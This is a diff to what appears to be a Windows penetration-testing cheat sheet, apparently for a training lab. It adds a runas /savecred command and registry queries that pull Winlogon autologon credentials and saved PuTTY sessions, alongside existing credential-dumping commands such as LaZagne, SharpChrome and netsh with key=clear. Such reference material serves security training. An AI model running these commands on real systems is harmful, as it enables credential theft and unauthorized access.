@@ -3323,6 +3323,7 @@ There is no command-line version of the GUI consent prompt, so its necessary to 
 | `where /R C:\ *.config` | Search for file extensions |
 | `Get-ChildItem C:\ -Recurse -Include *.rdp, *.config, *.vnc, *.cred -ErrorAction Ignore` | Search for file extensions using PowerShell |
 | `cmdkey /list` | List saved credentials |
+| `runas /savecred /user:USERNAME "COMMAND HERE"`|Use saved credential to run command |
 | `.\SharpChrome.exe logins /unprotect` | Retrieve saved Chrome credentials |
 | `.\lazagne.exe -h` | View LaZagne help menu |
 | `.\lazagne.exe all` | Run all LaZagne modules |
@@ -3330,6 +3331,8 @@ There is no command-line version of the GUI consent prompt, so its necessary to 
 | `netsh wlan show profile` | View saved wireless networks |
 | `netsh wlan show profile ilfreight_corp key=clear` | Retrieve saved wireless passwords |
 | `Invoke-SqliteQuery -Database $db -Query "SELECT Text FROM Note" \| ft -wrap`| Import [PSSQLITE Module](https://github.com/RamblingCookieMonster/PSSQLite) to view data from Sticky Notes DB |
+| `reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"`| Query registry for Autologon credentials |
+| `reg query HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions`| Query registry to review saved PuTTY Sessions. Add Session name to query Session|
 
 Other files of interest within Windows include 
 ```
@@ -3351,6 +3354,8 @@ Other files of interest within Windows include
 %WINDIR%\System32\drivers\etc\hosts
 C:\ProgramData\Configs\*
 C:\Program Files\Windows PowerShell\*
+HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon
+Computer\HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions\<SESSION NAME>
 ```
 
 ### Other Commands
